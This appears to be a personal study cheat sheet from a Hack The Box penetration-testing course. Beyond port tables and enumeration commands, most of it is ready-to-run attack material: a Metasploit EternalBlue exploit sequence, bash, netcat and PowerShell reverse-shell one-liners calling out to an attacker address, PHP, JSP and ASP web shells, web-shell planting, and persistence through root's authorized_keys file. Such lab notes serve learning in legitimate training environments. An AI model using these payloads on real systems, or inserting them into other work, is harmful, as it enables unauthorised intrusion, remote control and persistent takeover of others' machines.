## Getting started Module 

Commong ports : 

| Port | Protocol    | Service        |
|------|-------------|----------------|
| 20/21| (TCP)       | FTP            |
| 22   | (TCP)       | SSH            |
| 23   | (TCP)       | Telnet         |
| 25   | (TCP)       | SMTP           |
| 80   | (TCP)       | HTTP           |
| 161  | (TCP/UDP)   | SNMP           |
| 389  | (TCP/UDP)   | LDAP           |
| 443  | (TCP)       | SSL/TLS (HTTPS)|
| 445  | (TCP)       | SMB            |
| 3389 | (TCP)       | RDP            |

SMB 

    nmap --script smb-os-discovery.nse -p445 10.10.10.40
  
    smbclient -N -L \\\\10.129.42.253

    smbclient \\\\10.129.42.253\\users

    // to add user

    smbclient -U bob \\\\10.129.42.253\\users

gobuster dir :

    gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt

gobuster dns :

    gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

WhatWeb to extract the version of webservers, frameworks ...etc

    whatweb 10.10.10.121
    whatweb --no-errors 10.10.10.121

Search for common exploits :

1. Downlaod exploitdb  `sudo apt install exploitdb -y`
2. Search for the exploit `searchsploit openssh 7.2`

We can also utilize online exploit databases to search for vulnerabilities, like Exploit DB, Rapid7 DB, or Vulnerability Lab.

Metasploit example : 

1. search exploit eternalblue
2. use exploit/windows/smb/ms17_010_psexec
3. set RHOSTS 10.10.10.40 
4. set LHOST tun0
5. check
6. exploit 

Rev shells 

    bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

Upgrading TTY :

    python -c 'import pty; pty.spawn("/bin/bash")'

    www-data@remotehost$ ^Z

    MysterPedro@htb[/htb]$ stty raw -echo;fg

    [Enter]
    [Enter]
    www-data@remotehost$

after we get interactive shell

either we set Term to `export TERM=xterm` or 


    MysterPedro@htb[/htb]$ echo $TERM

    xterm-256color

    MysterPedro@htb[/htb]$ stty size

    67 318

    www-data@remotehost$ export TERM=xterm-256color

    www-data@remotehost$ stty rows 67 columns 318

Web Shell : 

    php : <?php system($_REQUEST["cmd"]); ?>
    php : <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
    jsp : <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
    asp : <% eval request("cmd") %>

Uploading a Web Shell :
Either we upload it thought a vuln, or 

    echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

    http://SERVER_IP:PORT/shell.php?cmd=id

SSH Keys : 
    ssh-keygen -f key
    echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
    chmod 600 key
    ssh root@10.10.10.10 -i key

Run sudo for other user : 

    MysterPedro@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo

    MysterPedro@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
Format xml grep to `xmllint --format -`